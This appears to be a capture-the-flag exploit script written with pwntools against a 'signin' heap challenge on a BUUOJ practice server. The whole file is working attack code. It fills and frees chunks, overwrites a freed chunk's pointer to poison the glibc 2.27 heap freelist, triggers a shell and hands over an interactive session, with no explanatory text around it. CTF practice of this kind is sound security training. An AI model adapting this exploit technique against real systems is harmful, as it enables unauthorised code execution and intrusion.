from pwn import *

# p = process('./signin')
p = remote('node4.buuoj.cn', 26300)
elf = ELF('./signin')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')


def add(id_):
    p.recvuntil(b'your choice?')
    p.sendline(b'1')
    p.recvuntil(b'idx?')
    p.sendline(id_)


def edit(id_, mess):
    p.recvuntil(b'your choice?')
    p.sendline(b'2')
    p.recvuntil(b'idx?')
    p.sendline(id_)
    p.send(mess)


def delete(id_):
    p.recvuntil(b'your choice?')
    p.sendline(b'3')
    p.recvuntil(b'idx?')
    p.sendline(id_)


def shell():
    p.recvuntil(b'your choice?')
    p.sendline(b'6')


for i in range(8):
    add(str(i))
for i in range(8):
    delete(str(i))
ptr = 0x4040c0
add(b'8')
payload = p64(ptr - 0x10)
edit(b'7', payload)
shell()
p.interactive()
